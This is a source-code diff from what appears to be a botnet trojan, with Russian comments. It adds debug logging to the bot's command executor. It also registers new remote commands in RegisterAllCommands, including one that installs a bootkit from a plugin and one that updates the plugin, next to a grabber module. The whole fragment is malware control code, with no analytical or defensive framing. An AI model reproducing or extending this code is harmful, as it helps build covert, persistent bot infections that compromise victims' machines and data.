@@ -325,7 +325,7 @@ bool TaskManagerSleep(PTaskManager Manager)
 //	}
 //	while (!M->Terminated);
 //	return true;
-//}
+//}
 
 //----------------------------------------------------------------------------
 
@@ -576,6 +576,14 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command);
 
 bool ExecuteCommand(LPVOID Manager, PCHAR Command, PCHAR Args, bool Deferred)
 {
+	TASKDBG("Task", "ExecuteCommand: manager=0x%X command='%s' args='%s' defered=%d", 
+		Manager,
+		((Command == NULL) ? "(null)":Command),
+		((Args == NULL) ? "(null)":Args),
+		Deferred
+		);
+
+
 	// Выполнить команду Command с аргументами Args
 	// В случае если Deferred == true выполнение команды будет передано
 	// В поток выполнения
@@ -591,6 +599,8 @@ bool ExecuteCommand(LPVOID Manager, PCHAR Command, PCHAR Args, bool Deferred)
 
 	// Определяем метод команды
 	TCommandMethod Method = GetCommandMethod(M, Command);
+
+	TASKDBG("Task", "ExecuteCommand: GetCommandMethod return 0x%X", Method);
 	if (Method == NULL)
 		return false;
 
@@ -846,6 +856,12 @@ void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
 {
 
 	// Регистрируем известные команды бота
+
+	// Команда установки Bootkit из плага
+	RegisterCommand(Manager, (PCHAR)Plugin::CommandInstallBk, Plugin::ExecuteInstallBk);
+
+	// Команда обновления плага
+	RegisterCommand(Manager, (PCHAR)Plugin::CommandUpdatePlug, Plugin::ExecuteUpdatePlug);
 
 	// Команда grabber
 	#ifdef GrabberH
